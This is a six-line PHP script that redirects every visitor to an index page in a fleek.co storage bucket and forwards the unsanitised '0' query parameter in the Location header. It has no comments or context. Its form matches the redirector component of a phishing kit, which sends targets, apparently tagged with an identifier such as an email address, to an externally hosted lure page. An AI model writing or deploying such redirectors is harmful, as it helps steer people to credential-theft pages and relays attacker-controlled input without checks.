<?php 
$mainlnk = "https://storageapi.fleek.co/017961e8-eb81-4546-bb5d-47bb64a698e8-bucket/abv/index.html"; 
$gen_link = "Location: ".$mainlnk."?0=".$_GET['0'];
header($gen_link);
exit;
?>